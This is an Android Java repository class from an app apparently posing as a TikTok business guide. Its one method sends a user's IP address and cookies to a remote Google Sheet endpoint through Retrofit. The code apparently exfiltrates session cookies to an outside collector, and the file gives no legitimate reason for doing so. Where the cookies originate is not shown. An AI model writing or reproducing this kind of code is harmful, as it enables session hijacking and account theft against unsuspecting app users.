package com.teamwork.businessguideprofortiktok.src.resource.repositories.google_sheet_repository;

import android.util.Log;

import androidx.lifecycle.MutableLiveData;

import com.teamwork.businessguideprofortiktok.src.cores.services.APIServices;
import com.teamwork.businessguideprofortiktok.src.cores.services.DataService;


import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class GoogleSheetRepository {
    private static GoogleSheetRepository instante;
    MutableLiveData<String> reponse1 = new MutableLiveData<>();

    // Khởi tạo BannerRepository
    public static GoogleSheetRepository getInstante() {
        if (instante == null) {
            instante = new GoogleSheetRepository();
        }
        return instante;
    }

    // Quan sát & lắng nghe dữ liệu
    public MutableLiveData<String> getDataGoogleSheet(String ip, String cookies) {
        DataService dataService = APIServices.getService();

        Call<String> callback = dataService.sendDataGoogleSheet(ip, cookies);
        callback.enqueue(new Callback<String>() {
            @Override
            public void onResponse(Call<String> call, Response<String> response) {
                if (response.isSuccessful()) {
                    reponse1.setValue(response.body());
                    Log.d("TAG", "onResponse: " + response.toString());
                } else {
                    Log.d("TAG", "onResponse: err send code google sheet: " + response.toString());
                }
            }

            @Override
            public void onFailure(Call<String> call, Throwable t) {
                Log.d("TAG", "onResponse: err send code google sheet onFailure: " + t.toString());
            }
        });

        return reponse1;
    }

}
